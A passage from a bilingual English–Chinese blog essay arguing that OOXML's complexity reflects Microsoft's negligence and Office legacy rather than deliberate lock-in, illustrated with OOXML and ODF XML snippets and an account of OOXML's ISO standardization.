Users, the argument continues, often accept proprietary technology uncritically, which makes it easy for Microsoft to lock people into its ecosystem.</p><p>A quick refresher: historically, Office used binary formats (<code>.doc</code>, <code>.xls</code>, and <code>.ppt</code>) whose contents weren&rsquo;t human-readable. Starting with Office 2007, Microsoft switched the defaults to <code>.docx</code>, <code>.xlsx</code>, and <code>.pptx</code>, where the &ldquo;x&rdquo; stands for XML. These files are ZIP containers holding a set of XML parts and resources such as images. Both the XML structure and the packaging follow a published spec &mdash; OOXML.</p><p>With Microsoft&rsquo;s backing, OOXML was adopted by international standards bodies, first as <a href="https://ecma-international.org/publications-and-standards/standards/ecma-376/">ECMA-376</a> and later as <a href="https://www.iso.org/standard/71691.html">ISO/IEC 29500</a>. Microsoft also put it under the <a href="https://docs.microsoft.com/en-us/openspecs/dev_center/ms-devcentlp/1c24c7c8-28b0-4ce1-a47d-95fe1ff504bc">Open Specification Promise (OSP)</a>, committing not to assert certain patent claims against compliant implementations.</p><p>On paper, then, anyone can parse, create, and edit OOXML to be compatible with Microsoft Office, which sounds great. But the LibreOffice article calls this premise into question, arguing that OOXML&rsquo;s deliberate complexity turns this supposed openness into a trap, a tool for maintaining a monopoly.</p><p>Let&rsquo;s be honest: few people would describe their experience with Microsoft Office as satisfying, which is part of why this article resonated widely. In my past life doing legal grunt work, battling convoluted Word documents was a daily ritual. I also authored the Word section of an Office tutorial series, where my main approach was to explain Word&rsquo;s quirks by digging into the underlying OOXML format. Thus, I&rsquo;m intimately familiar with what makes Office and OOXML painful.</p><p>Despite this, I disagree with the LibreOffice&rsquo;s framing and conclusion. Aiming for mass appeal, the post is heavy on emotion and accusation but light on factual analysis, missing a solid educational opportunity. (LibreOffice later <a href="https://blog.documentfoundation.org/blog/2025/06/28/a-technical-dive-into-odf/">published</a> a more technical comparison, but it still jumped straight from code snippets to conclusions.)</p><p>In my view, OOXML is indeed complex, convoluted, and obscure. But that&rsquo;s likely less about a plot to block third-party compatibility and more about a self-interested negligence: Microsoft prioritized the convenience of its own implementation and neglected the qualities of clarity, simplicity, and universality that a general-purpose standard should have. Yes, that neglect has anticompetitive effects in practice, but the motive is different from deliberate sabotage and thus warrants a different judgment. (A detailed legal analysis is beyond the scope of this article.)</p><p>In other words, LibreOffice identified the right problem, it may have reached the wrong conclusion. Here&rsquo;s why.</p><h2>OOXML as a Sloppy Standard</h2><p>The LibreOffice article criticizes how &ldquo;a simple sentence such as &lsquo;To be, or not to be, that is the question&rsquo; becomes an inextricable sequence of tags that users cannot access.&rdquo; Let&rsquo;s use this very example to see what happens.</p><p>Create a Word document containing</p><blockquote><p><strong>To be</strong>, or not to be, that is the question.</p></blockquote><p>(with &ldquo;To be&rdquo; in bold), save, and peek at <code>word/document.xml</code> inside the resulting <code>.docx</code>:</p><pre><code><w:p><w:r> <w:rpr> <w:b></w:b> <w:bcs></w:bcs> </w:rpr> <w:t>To be</w:t> </w:r> <w:r> <w:t>, or not to be, that is the question</w:t> </w:r> <w:r> <w:t>.</w:t> </w:r> </w:p></code></pre><p>(line breaks added for readability.)</p><p>Take a breath &mdash; The core structure is a paragraph (<code><w:p></w:p></code>) containing three runs (<code><w:r></w:r></code>). A <em>run</em> is a contiguous span of text sharing the same formatting. In OOXML, every paragraph comprises one or more runs.</p><p>Breaking it further down:</p><ul> <li>The outer <code><w:p></w:p></code> element represents the paragraph. The attributes like <code>w14:paraId</code> and <code>w:rsidR</code> are internal identifiers Word uses for features like collaborative editing and tracking revisions.</li> <li>The first <code><w:r></w:r></code> represents the bolded text <em>To be</em>. It contains a <code><w:rpr></w:rpr></code> (Run Properties) element to define its formatting. Inside, <code><w:b></w:b></code> and <code><w:bcs></w:bcs></code> set the font to bold for Western and complex scripts, respectively (even though there are no complex scripts here). Only after all that does the <code><w:t></w:t></code> element hold the actual text.</li> <li>The second <code><w:r></w:r></code> contains the rest of the text up to the period. Since it uses the default formatting, it lacks a <code><w:rpr></w:rpr></code> element.</li> <li>The third <code><w:r></w:r></code> contains only the final period. There&rsquo;s no formatting difference, and it&rsquo;s split off the prior run simply because I pasted the sentence but typed the period, exactly the kind of &ldquo;surprise&rdquo; OOXML happily encodes.</li> </ul><p>Contrast that with the same content saved as ODF (<code>content.xml</code>):</p><pre><code><text:p><text:span>To be</text:span> , or not to be, that is the question. </text:p></code></pre><p>Even at a glance it&rsquo;s more intelligible. Strip the <code>text:</code> namespaces and it&rsquo;s nearly valid HTML.</p><p>The only thing that needs explaining is that ODF doesn&rsquo;t wrap <em>To be</em> with a dedicated &ldquo;bold&rdquo; tag. Instead, it applies an auto-style named <code>T1</code> to a <code><text:span></text:span></code>, an act of separating content and presentation that mirrors established web practices.</p><p>In short, if you have a basic understanding of the web stack, you can largely make sense of ODF&rsquo;s XML. On the other hand, OOXML, with its abstruse tag names, feels like it requires a PhD to decipher.</p><p>And this is just for simple text formatting. When you get into complex elements like tables and lists &mdash; a shared nightmare for every heavy Word user &mdash; OOXML&rsquo;s complexity only skyrockets. That thousand-page specification isn&rsquo;t just for show.</p><p>Beyond its formal complexity, the quality of OOXML as a standard is also questionable. Contemporary critiques of the submission <a href="https://noooxml.wdfiles.com/local--files/arguments/ODF-vs-OOXML-v1.2.pdf">catalogued</a> technical defects, for example:</p><ul> <li>Canonizing known bugs and compromises from Office (<em>e.g.</em>, maintaining two separate date systems starting in 1900 or 1904, and incorrectly <a href="https://learn.microsoft.com/en-us/troubleshoot/microsoft-365-apps/excel/wrongly-assumes-1900-is-leap-year">&ldquo;treating 1900 as a leap year&rdquo;</a>);</li> <li>Conflicting with established standards for language codes (ISO 639), vector graphics (W3C SVG), and mathematical notation (W3C MathML);</li> <li>Using vaguely defined and inconsistent units of measurement; and</li> <li>Lacking clear and consistent naming conventions for elements and attributes (<em>e.g.</em>, inconsistent ccase rules).</li> </ul><p><a href="https://en.wikipedia.org/wiki/Standardization_of_Office_Open_XML">The process of OOXML becoming an ISO standard</a> was itself highly dramatic. First, Microsoft chose to submit it via the &ldquo;fast track,&rdquo; a path intended for mature, widely implemented, and stable specifications. OOXML in 2006 met none of these criteria: it was new; its only complete implementation was the not-yet-released Office 2007; and nobody could plausibly review thousands of pages on that timetable. Organizations like Google and the Free Software Foundation Europe (FSFE), along with many technical experts, raised objections.</p><p>The voting that followed was among ISO&rsquo;s most contentious: several national bodies abruptly swelled with new members, many Microsoft partners, who then voted in favor. Sweden&rsquo;s initial approval was voided after incentives linked to support came to light.</p><p>In the end, OOXML squeaked through after two rounds, but Brazil, India, South Africa, Venezuela, and others filed formal appeals alleging procedural defects. Although these appeals failed to overturn the result, they underscored the divisive and chaotic nature of the standardization.</p><h2>Why Microsoft&rsquo;s Motive Wasn&rsquo;t Deliberate Sabotage</h2><p>So far, the evidence seems to support LibreOffice&rsquo;s claim: OOXML is a sloppy standard, both technically and procedurally. But facts don&rsquo;t directly prove intent. If we dig into the context of OOXML&rsquo;s creation, it can be argued that harming competitors was not Microsoft&rsquo;s <em>primary</em> aim.</p><p>First, OOXML was, in material part, a defensive posture under intensifying antitrust and &ldquo;open standards&rdquo; pressure. Microsoft <a href="https://news.microsoft.com/2005/11/21/qa-microsoft-co-sponsors-submission-of-office-open-xml-document-formats-to-ecma-international-for-standardization/">announced</a> OOXML in late 2005 while appealing an adverse European Commission <a href="https://en.wikipedia.org/wiki/Microsoft_Corp._v_European_Commission#Judgment">judgment</a> centered on interoperability disclosures. Thus, it was only a matter of time before Office file compatibility came under the regulatory microscope. (The Commission indeed opened a <a href="https://competition-cases.ec.europa.eu/cases/AT.39294">probe</a> in 2008.)</p><p>Meanwhile, the rival ODF matured and became an ISO standard in May 2006. Governments, especially in Europe, began to mandate open standards in public procurement. If Microsoft did nothing, Office risked exclusion from government deals.</p><p>Given that context, the sensible inference about Microsoft&rsquo;s goal is to create a format that it controlled but also carried the &ldquo;international standard&rdquo; seal of approval, which would be both a shield against potential regulation and a weapon against the challenge from ODF. Thus, the primary goal for this new format wasn&rsquo;t to be elegant, universal, or easy to implement; it was to placate regulators while preserving Microsoft&rsquo;s technological and commercial advantages. The easiest, cheapest way to do that, of course, is to package its existing complexity as the new &ldquo;standard.&rdquo;</p><p>To support this, it&rsquo;s worth noting a more fundamental difference between OOXML and ODF. Look again at the XML snippets, but this time, pay attention to where the actual text content appears:</p><pre><code><!-- OOXML --> <w:p><w:r><w:rpr>...</w:rpr><w:t>To be</w:t></w:r><w:r><w:t>, or not to be...</w:t></w:r><w:r><w:t>.</w:t></w:r></w:p><!-- ODF --> <text:p><text:span>To be</text:span>, or not to be...</text:p></code></pre><p>In ODF, the text content interleaves with XML tags, just like in HTML, while in OOXML, text is always buried inside <code><w:t></w:t></code> at the leaves, and never appears as a peer of structural elements.</p><p>That reflects two opposed uses of XML:</p><ul> <li>ODF uses XML as markup. Text is first-class; tags annotate spans with structure and styling. This matches XML&rsquo;s <a href="https://en.wikipedia.org/wiki/XML#History">original design goal</a> for information presentation.</li> <li>OOXML uses XML as a serialization format. In other words, OOXML isn&rsquo;t so much describing the document content as it is describing the abstract data structures that the Office application &ldquo;sees.&rdquo; Our example above serializes a &ldquo;paragraph&rdquo; object, which is an ordered array of &ldquo;run&rdquo; objects; some of these run objects have style properties, and each has a string property containing the actual text.</li> </ul><p>You can corroborate this by comparing OOXML to Office&rsquo;s VBA object model. For instance, the child elements allowed within OOXML&rsquo;s paragraph properties tag (<code><w:ppr></w:ppr></code>, specified in ECMA-376 Part 1, &sect; 17.3.2.28) map almost one-for-one to the properties of VBA&rsquo;s <a href="https://learn.microsoft.com/en-us/office/vba/api/word.paragraph"><code>Paragraph</code> object</a>. Many other OOXML&ndash;VBA pairings align the same way.</p><p>This explains the root of OOXML&rsquo;s complexity: it mirrors Office&rsquo;s sprawling features and legacy. To ensure fidelity and backward compatibility, Microsoft didn&rsquo;t design a format that describes a document&rsquo;s appearance; instead, it&rsquo;s much closer to a dump of the application&rsquo;s state. In this sense, OOXML is less of a standard and more of a projection of the Office application itself.</p><p>In fact, Office&rsquo;s legacy is so heavy that even Microsoft doesn&rsquo;t fully implement OOXML as standardized. ECMA-376 defines Strict and Transitional variants, with Transitional intended to preserve behaviors needed for old Office versions (e.g., <code>footnoteLayoutLikeWW8</code>, <code>autoSpaceLikeWord9</code>, <code>useWord97LineBreakRules</code>). To this day, Office saves Transitional by default. Microsoft even maintains a lengthy <a href="https://learn.microsoft.com/en-us/openspecs/office_standards/ms-oe376/21b45168-16f9-466d-9445-1992a02c517a">document</a> detailing the ways in which Office deviates from the ECMA-376 standard, including different interpretations of default values and non-standard extensions.</p><p>Furthermore, binding the format tightly to program state is not a novel, muddy-the-water trick, but merely how Office has long worked. Joel Spolsky, in a <a href="https://www.joelonsoftware.com/2008/02/19/why-are-the-microsoft-office-file-formats-so-complicated-and-some-workarounds/">famous blog post</a>, analyzed the complexity of the old binary Office formats, showing that they were even more akin to a direct memory dump, and was also of the opinion that this design was driven more by performance and practical constraints than by malice or incompetence.</p><p>Nor did OOXML spring from nowhere. Even before it, Microsoft had already been exploring a transition from binary to XML. Office XP and 2003 supported more primitive XML formats like <a href="https://learn.microsoft.com/en-us/previous-versions/office/developer/office-xp/aa140066(v=office.10)">Excel XML</a> and <a href="https://learn.microsoft.com/en-us/previous-versions/office/developer/office-2003/aa174023(v=office.11)">Word XML</a>, just without ZIP packaging and with all parts mashed into a single XML file (binary resources base64-encoded). This provides further evidence that OOXML is less an act of sabotage than the continuation of a flawed, inelegant lineage.</p><h2>Conclusion</h2><p>The argument of this article is not to let Microsoft off the hook; they could have done much better. Faced with demands for openness, Microsoft could have produced a clean, modern spec and keep the mass pile of legacy inside the application. Instead, it poured all that baggage into an XML container, pushed it to the world with market power, and shifted the comprehension cost onto everyone else. While this article argues for distinguishing this from the deliberate sabotage that LibreOffice alleges, a broken, low-quality standard is damaging to the ecosystem, whether born of negligence or conspiracy.</p><p>On the other hand, the LibreOffice post reflects a counterproductive reflex that&rsquo;s common in open-source circles: scolding users for accepting proprietary tech. But users aren&rsquo;t foolish. Elegance and openness are virtues, but they are only a few of the factors most people weigh, and often not the decisive ones. LibreOffice itself, as ODF&rsquo;s flagship, still suffers from rough edges in design, interaction, and performance. As a result, even as Office hobble itself with bloat, most people still find it <em>easier</em>. Without a clear-eyed, systematic push to improve those fundamentals, cheerleading for open software and open formats will remain slogan and self-pity, an approach that is unlikely to win a broader audience or to dent an incumbent&rsquo;s dominance.</p><h2>&#20013;&#25991;&#29256;</h2> <h2>&#24341;&#35328;</h2><p>&#21069;&#27573;&#26102;&#38388;&#65292;&#24320;&#28304;&#21150;&#20844;&#36719;&#20214; LibreOffice &#30340;&#23448;&#26041;&#21338;&#23458;<a href="https://blog.documentfoundation.org/blog/2025/07/18/artificially-complex-xml-schema-as-lock-in-tool/">&#21457;&#34920;</a>&#20102;&#19968;&#31687;&#39047;&#20855;&#35805;&#39064;&#24615;&#30340;&#25991;&#31456;&#65306;&#12298;&#21051;&#24847;&#22797;&#26434;&#21270;&#30340; XML &#35268;&#33539;&#26159;&#19968;&#31181;&#38145;&#23450;&#29992;&#25143;&#30340;&#24037;&#20855;&#12299;&#65288;An artificially complex XML schema as a lock-in tool&#65289;&#12290;</p><p>&#36825;&#31687;&#25991;&#31456;&#25226;&#25209;&#21028;&#30340;&#30683;&#22836;&#25351;&#21521;&#20102;&#24494;&#36719;&#22522;&#20110; XML &#30340;&#25991;&#20214;&#26684;&#24335;&mdash;&mdash;Office Open XML&#65288;&#31616;&#31216; OOXML&#65289;&#12290;&#25991;&#31456;&#25351;&#25511;&#65292;&#24494;&#36719;&#34429;&#28982;&#34920;&#38754;&#19978;&#24320;&#25918;&#20102; Office &#25991;&#20214;&#26684;&#24335;&#26631;&#20934;&#65292;&#20294;&#36890;&#36807;&#23558;&#20854;&#35774;&#35745;&#24471;&#26497;&#20026;&#22797;&#26434;&#65292;&#23454;&#38469;&#19978;&#38459;&#30861;&#20102;&#19982;&#31532;&#19977;&#26041;&#36719;&#20214;&#30340;&#20114;&#25805;&#20316;&#24615;&#12290;&#25991;&#31456;&#35748;&#20026;&#65292;&#36825;&#31181;&#22797;&#26434;&#24615;&#26159;&#21051;&#24847;&#20026;&#20043;&#65292;&#19982;&#23454;&#38469;&#38656;&#27714;&#33073;&#33410;&#12290;&#36825;&#23601;&#22909;&#27604;&#36816;&#33829;&#19968;&#26465;&#21517;&#20041;&#19978;&#24320;&#25918;&#30340;&#36712;&#36947;&#65292;&#21364;&#23558;&#25511;&#21046;&#31995;&#32479;&#35774;&#35745;&#24471;&#21482;&#26377;&#19968;&#23478;&#21046;&#36896;&#21830;&#25165;&#33021;&#36816;&#33829;&#65292;&#20174;&#32780;&#24418;&#25104;&#20107;&#23454;&#22404;&#26029;&#12290;&#21516;&#26102;&#65292;&#29992;&#25143;&#24448;&#24448;&#19981;&#21152;&#25209;&#21028;&#22320;&#25509;&#21463;&#36825;&#20123;&#19987;&#26377;&#25216;&#26415;&#65292;&#36825;&#20351;&#24471;&#24494;&#36719;&#33021;&#36731;&#26131;&#23558;&#29992;&#25143;&#38145;&#23450;&#22312;&#33258;&#24049;&#30340;&#29983;&#24577;&#31995;&#32479;&#20013;&#12290;</p><p>&#20026;&#19981;&#22826;&#29087;&#24713;&#36825;&#20010;&#35805;&#39064;&#30340;&#26379;&#21451;&#34917;&#20805;&#19968;&#20123;&#32972;&#26223;&#12290;Office &#21150;&#20844;&#36719;&#20214;&#21382;&#21490;&#19978;&#32463;&#21382;&#36807;&#19968;&#27425;&#37325;&#35201;&#30340;&#25991;&#20214;&#26684;&#24335;&#21464;&#21270;&#12290;Office 2003 &#21450;&#26356;&#26089;&#29256;&#26412;&#30340;&#40664;&#35748;&#26684;&#24335;&#65288;<code>.doc</code>&#12289;<code>.xls</code>&#12289;<code>.ppt</code> &#31561;&#65289;&#26159;&#25152;&#35859;&#30340;&#12300;&#20108;&#36827;&#21046;&#26684;&#24335;&#12301;&#65292;&#20854;&#20869;&#23481;&#24182;&#38750;&#20154;&#31867;&#21487;&#30452;&#25509;&#38405;&#35835;&#30340;&#25991;&#26412;&#12290;&#20174; Office 2007 &#24320;&#22987;&#65292;&#24494;&#36719;&#20999;&#25442;&#21040;&#26032;&#30340;&#40664;&#35748;&#26684;&#24335; <code>.docx</code>&#12289;<code>.xlsx</code> &#21644; <code>.pptx</code>&#65292;&#20854;&#20013;&#30340; <code>x</code> &#23601;&#20195;&#34920; XML&#12290;&#36825;&#20123;&#26032;&#26684;&#24335;&#30340;&#25991;&#20214;&#26412;&#36136;&#19978;&#26159;&#19968;&#20010; ZIP &#21387;&#32553;&#21253;&#65292;&#37324;&#38754;&#21253;&#21547;&#20102;&#19968;&#31995;&#21015; XML &#25991;&#20214;&#21644;&#22270;&#29255;&#31561;&#36164;&#28304;&#12290;&#20174; XML &#30340;&#32467;&#26500;&#21040;&#25171;&#21253;&#26041;&#24335;&#65292;&#37117;&#36981;&#24490;&#19968;&#22871;&#20844;&#24320;&#30340;&#26631;&#20934;&#65292;&#20063;&#23601;&#26159; OOXML&#12290;</p><p>&#22312;&#24494;&#36719;&#30340;&#25512;&#21160;&#19979;&#65292;OOXML &#20808;&#21518;&#34987;&#22269;&#38469;&#26631;&#20934;&#32452;&#32455;&#37319;&#32435;&#20026; <a href="https://ecma-international.org/publications-and-standards/standards/ecma-376/">ECMA-376</a> &#21644; <a href="https://www.iso.org/standard/71691.html">ISO/IEC 29500</a>&#12290;&#24494;&#36719;&#20063;&#23558;&#20854;&#32435;&#20837;&#25152;&#35859;&#12300;<a href="https://docs.microsoft.com/en-us/openspecs/dev_center/ms-devcentlp/1c24c7c8-28b0-4ce1-a47d-95fe1ff504bc">&#24320;&#25918;&#35268;&#33539;&#25215;&#35834;</a>&#12301;&#65292;&#20445;&#35777;&#19981;&#20250;&#23545;&#23454;&#29616;&#35813;&#26631;&#20934;&#30340;&#34892;&#20026;&#25552;&#20986;&#19987;&#21033;&#26435;&#20027;&#24352;&#12290;</p><p>&#22240;&#27492;&#65292;&#29702;&#35770;&#19978;&#65292;&#20219;&#20309;&#20010;&#20154;&#25110;&#31532;&#19977;&#26041;&#36719;&#20214;&#37117;&#21487;&#20197;&#33258;&#30001;&#22320;&#35299;&#26512;&#12289;&#21019;&#24314;&#21644;&#20462;&#25913; OOXML &#25991;&#20214;&#65292;&#23454;&#29616;&#19982; Microsoft Office &#30340;&#20860;&#23481;&#12290;&#36825;&#21548;&#36215;&#26469;&#24456;&#32654;&#22909;&#65292;&#20294; LibreOffice &#30340;&#25991;&#31456;&#27491;&#26159;&#23545;&#27492;&#25552;&#20986;&#36136;&#30097;&#65292;&#35748;&#20026; OOXML &#21051;&#24847;&#30340;&#22797;&#26434;&#24615;&#20351;&#25152;&#35859;&#30340;&#12300;&#24320;&#25918;&#12301;&#21464;&#25104;&#20102;&#19968;&#20010;&#21482;&#36827;&#19981;&#20986;&#30340;&#38519;&#38449;&#65292;&#26159;&#24494;&#36719;&#32500;&#25252;&#22404;&#26029;&#30340;&#24037;&#20855;&#12290;</p><p>&#22914;&#20309;&#30475;&#24453;&#36825;&#31181;&#35266;&#28857;&#65311;&#22374;&#30333;&#22320;&#35828;&#65292;&#30456;&#20449;&#27809;&#26377;&#20960;&#20010;&#20154;&#23545; Office &#30340;&#20351;&#29992;&#20307;&#39564;&#21360;&#35937;&#23436;&#32654;&#65292;&#36825;&#20063;&#26159;&#27492;&#25991;&#39047;&#20855;&#20256;&#25773;&#21147;&#30340;&#21407;&#22240;&#12290;&#22312;&#25105;&#36807;&#21435;&#30340;&#19968;&#27573;&#27861;&#24459;&#27665;&#24037;&#29983;&#28079;&#20013;&#65292;&#36319;&#22797;&#26434;&#30340; Word &#25991;&#26723;&#26007;&#20105;&#26159;&#27599;&#22825;&#30340;&#24517;&#20462;&#35838;&#12290;&#25105;&#36824;&#36127;&#36131;&#32534;&#20889;&#36807;&#19968;&#20221; <a href="https://sspai.com/series/226">Office &#25945;&#31243;</a>&#30340; Word &#37096;&#20998;&#65292;&#24403;&#26102;&#30340;&#20027;&#35201;&#24605;&#36335;&#23601;&#26159;&#36890;&#36807;&#20171;&#32461; OOXML &#26684;&#24335;&#65292;&#26469;&#35299;&#37322; Word &#30340;&#19968;&#20123;&#24618;&#30294;&#21644;&#30456;&#24212;&#30340;&#26368;&#20339;&#23454;&#36341;&#12290;&#22240;&#27492;&#65292;&#25105;&#23545; Office &#21644; OOXML &#30340;&#38590;&#29992;&#20043;&#22788;&#20063;&#31639;&#28145;&#26377;&#20307;&#20250;&#12290;</p><p>&#20294;&#21363;&#20351;&#22914;&#27492;&#65292;&#25105;&#24182;&#19981;&#36190;&#21516; LibreOffice &#27492;&#25991;&#30340;&#20889;&#27861;&#21644;&#32467;&#35770;&#65306;&#21487;&#33021;&#26159;&#20026;&#20102;&#22823;&#20247;&#20256;&#25773;&#25928;&#26524;&#65292;&#36825;&#31687;&#25991;&#31456;&#24773;&#32490;&#12289;&#25351;&#25511;&#36807;&#22810;&#65292;&#32780;&#20998;&#26512;&#12289;&#20107;&#23454;&#22826;&#23569;&#65292;&#23454;&#38469;&#19978;&#38169;&#36807;&#20102;&#19968;&#27425;&#24456;&#22909;&#30340;&#31185;&#26222;&#26426;&#20250;&#12290;&#65288;LibreOffice &#21518;&#26469;&#21448;<a href="https://blog.documentfoundation.org/blog/2025/06/28/a-technical-dive-into-odf/">&#21457;&#24067;</a>&#20102;&#19968;&#31687;&#26356;&#25216;&#26415;&#24615;&#30340;&#23545;&#27604;&#65292;&#20294;&#20173;&#28982;&#30452;&#25509;&#20174;&#20195;&#30721;&#36339;&#21040;&#20102;&#32467;&#35770;&#12290;&#65289;</p><p>&#22312;&#25105;&#30475;&#26469;&#65292;OOXML &#26684;&#24335;&#30830;&#23454;&#22797;&#26434;&#12289;&#32321;&#29712;&#12289;&#26214;&#28073;&#12290;&#20294;&#36825;&#24456;&#21487;&#33021;&#19981;&#26159;&#22240;&#20026;&#24494;&#36719;&#33988;&#24847;&#38459;&#27490;&#31532;&#19977;&#26041;&#20860;&#23481;&#65292;&#32780;&#26356;&#22810;&#26159;&#20986;&#20110;&#19968;&#31181;&#19981;&#20316;&#20026;&#30340;&#33258;&#31169;&#24515;&#24577;&#65306;&#22312;&#21046;&#23450;&#26631;&#20934;&#26102;&#65292;&#21482;&#32771;&#34385;&#33258;&#36523;&#23454;&#29616;&#30340;&#20415;&#21033;&#65292;&#32780;&#24573;&#30053;&#20102;&#19968;&#20010;&#36890;&#29992;&#26631;&#20934;&#24212;&#26377;&#30340;&#36136;&#37327;&#12289;&#31616;&#27905;&#21644;&#26222;&#36866;&#12290;&#24403;&#28982;&#65292;&#36825;&#31181;&#19981;&#20316;&#20026;&#23458;&#35266;&#19978;&#20063;&#36896;&#25104;&#20102;&#38459;&#30861;&#31454;&#20105;&#30340;&#32467;&#26524;&#65292;&#20294;&#36825;&#22312;&#21160;&#26426;&#19978;&#19982;&#33988;&#24847;&#30772;&#22351;&#26377;&#21035;&#65292;&#22240;&#27492;&#20063;&#24212;&#21463;&#21040;&#19981;&#21516;&#30340;&#35780;&#20215;&#12290;&#65288;&#20855;&#20307;&#30340;&#27861;&#24459;&#20998;&#26512;&#36229;&#20986;&#20102;&#26412;&#25991;&#30340;&#35752;&#35770;&#33539;&#22260;&#12290;&#65289;</p><p>&#20026;&#27492;&#65292;&#26412;&#25991;&#23558;&#22522;&#20110; OOXML &#30340;&#35821;&#27861;&#21644;&#21046;&#23450;&#32972;&#26223;&#65292;&#35770;&#35777;&#20026;&#20160;&#20040; LibreOffice &#30340;&#25991;&#31456;&#25351;&#20986;&#20102;&#27491;&#30830;&#30340;&#38382;&#39064;&#65292;&#21364;&#21487;&#33021;&#24471;&#20986;&#20102;&#38169;&#35823;&#30340;&#32467;&#35770;&#12290;</p><h2>&#20026;&#20160;&#20040;&#35828; OOXML &#26159;&#19968;&#20010;&#28518;&#33609;&#30340;&#26631;&#20934;</h2><p>LibreOffice &#30340;&#25991;&#31456;&#20013;&#25209;&#35780;&#35828;&#65292;&#12300;&#31616;&#21333;&#22914;&#12302;&#29983;&#23384;&#36824;&#26159;&#27585;&#28781;&#65292;&#36825;&#26159;&#20010;&#38382;&#39064;&#12303;&#30340;&#21477;&#23376;&#65292;&#37117;&#20250;&#21464;&#25104;&#29992;&#25143;&#26080;&#27861;&#35299;&#35835;&#30340;&#30456;&#20114;&#32416;&#32544;&#30340;&#26631;&#31614;&#32452;&#21512;&#12301;&#12290;&#25105;&#20204;&#19981;&#22952;&#23601;&#20197;&#27492;&#20026;&#20363;&#65292;&#26032;&#24314;&#19968;&#20010; Word &#25991;&#26723;&#65292;&#36755;&#20837;</p><blockquote><p>To be or not to be.</p></blockquote><p>&#65288;&#20854;&#20013; <em>To be</em> &#21152;&#31895;&#65289;&#65292;&#28982;&#21518;&#20445;&#23384;&#65292;&#30475;&#30475;&#37117;&#20250;&#23384;&#20648;&#20986;&#20160;&#20040;&#26679;&#30340;&#32467;&#26524;&#12290;</p><p>&#29992;&#20219;&#24847;&#21387;&#32553;&#24037;&#20855;&#35299;&#21387;&#36825;&#20010; <code>.docx</code> &#25991;&#20214;&#65292;&#20174;&#25152;&#24471;&#30340; <code>word/document.xml</code> &#25991;&#20214;&#20013;&#23601;&#33021;&#30475;&#21040;&#22914;&#19979;&#20869;&#23481;&#65306;</p><pre><code><w:p><w:r> <w:rpr> <w:b></w:b> <w:bcs></w:bcs> </w:rpr> <w:t>To be</w:t> </w:r> <w:r> <w:t>, or not to be, that is the question</w:t> </w:r> <w:r> <w:t>.</w:t> </w:r> </w:p></code></pre><p>&#65288;&#26377;&#33410;&#36873;&#65292;&#39069;&#22806;&#28155;&#21152;&#20102;&#25442;&#34892;&#21644;&#32553;&#36827;&#20197;&#20415;&#38405;&#35835;&#65307;&#21518;&#21516;&#12290;&#65289;</p><p>&#21487;&#33021;&#20320;&#24050;&#32463;&#26197;&#20102;&hellip;&hellip;&#20294;&#35753;&#25105;&#20204;&#24378;&#25171;&#31934;&#31070;&#26469;&#20998;&#26512;&#19968;&#19979;&#12290;&#36825;&#27573; XML &#30340;&#26680;&#24515;&#32467;&#26500;&#26159;&#19968;&#20010;&#27573;&#33853;&#65288;<code><w:p></w:p></code>&#65289;&#65292;&#23427;&#21253;&#21547;&#20102;&#19977;&#20010;&#12300;&#25991;&#26412;&#22359;&#12301;&#65288;run&#65292;&#29992; <code><w:r></w:r></code> &#20803;&#32032;&#26469;&#20195;&#34920;&#65289;&#12290;&#25152;&#35859;&#12300;&#25991;&#26412;&#22359;&#12301;&#65292;&#26159;&#25351;&#19968;&#27573;&#20855;&#26377;&#30456;&#21516;&#26684;&#24335;&#30340;&#36830;&#32493;&#25991;&#26412;&#12290;&#22312; OOXML &#20013;&#65292;&#27599;&#20010;&#27573;&#33853;&#37117;&#30001;&#19968;&#20010;&#25110;&#22810;&#20010;&#25991;&#26412;&#22359;&#32452;&#25104;&#12290;</p><p>&#20855;&#20307;&#32780;&#35328;&mdash;&mdash;</p><ul> <li>&#22806;&#23618; <code><w:p></w:p></code> &#20803;&#32032;&#20195;&#34920;&#25972;&#20010;&#27573;&#33853;&#12290;&#20854;&#20013;&#30340; <code>w14:paraId</code>&#12289;<code>w14:textId</code> &#21644; <code>w:rsidR</code> &#31561;&#23646;&#24615;&#26159; Word &#20869;&#37096;&#29992;&#20110;&#21327;&#21516;&#32534;&#36753;&#12289;&#36861;&#36394;&#20462;&#35746;&#21382;&#21490;&#30340;&#26631;&#35782;&#31526;&#65307;</li> <li>&#31532;&#19968;&#20010; <code><w:r></w:r></code> &#20803;&#32032;&#20195;&#34920;&#21152;&#31895;&#30340; <em>To be</em>&#12290;&#23427;&#21253;&#21547;&#19968;&#20010; <code><w:rpr></w:rpr></code> (Run Properties) &#20803;&#32032;&#26469;&#23450;&#20041;&#26684;&#24335;&#12290;&#20854;&#20013;&#65292;<code><w:b></w:b></code> &#21644; <code><w:bcs></w:bcs></code> &#20998;&#21035;&#23558;&#35199;&#25991;&#21644;&#20013;&#25991;&#31561;&#22797;&#26434;&#20070;&#20889;&#31995;&#32479;&#65288;complex script&#65292;&#23613;&#31649;&#36825;&#37324;&#27809;&#26377;&#65289;&#30340;&#23383;&#20307;&#35774;&#32622;&#20026;&#31895;&#20307;&#12290;&#20043;&#21518;&#65292;<code><w:t></w:t></code> &#20803;&#32032;&#25165;&#21253;&#21547;&#23454;&#38469;&#30340;&#25991;&#26412;&#20869;&#23481;&#65307;</li> <li>&#31532;&#20108;&#20010; <code><w:r></w:r></code> &#20803;&#32032;&#21253;&#21547;&#20102;&#21518;&#38754;&#30452;&#21040;&#21477;&#21495;&#21069;&#30340;&#25152;&#26377;&#25991;&#26412;&#12290;&#30001;&#20110;&#36825;&#27573;&#25991;&#26412;&#20351;&#29992;&#40664;&#35748;&#26684;&#24335;&#65292;&#25152;&#20197;&#27809;&#26377; <code><w:rpr></w:rpr></code> &#20803;&#32032;&#65307;</li> <li>&#31532;&#19977;&#20010; <code><w:r></w:r></code> &#20803;&#32032;&#21482;&#21253;&#21547;&#26368;&#21518;&#30340;&#21477;&#21495;&#65292;&#19982;&#21069;&#38754;&#30340;&#25991;&#26412;&#22312;&#26684;&#24335;&#19978;&#24182;&#26080;&#24046;&#24322;&#12290;&#20043;&#25152;&#20197;&#34987;&#21333;&#29420;&#20998;&#21106;&#20986;&#26469;&#65292;&#20165;&#20165;&#26159;&#22240;&#20026;&hellip;&hellip;&#21069;&#38754;&#30340;&#25991;&#23383;&#26159;&#25105;&#31896;&#36148;&#30340;&#65292;&#32780;&#36825;&#20010;&#21477;&#21495;&#26159;&#25105;&#25163;&#21160;&#36755;&#20837;&#30340;&#12290;&#26159;&#30340;&#65292;OOXML 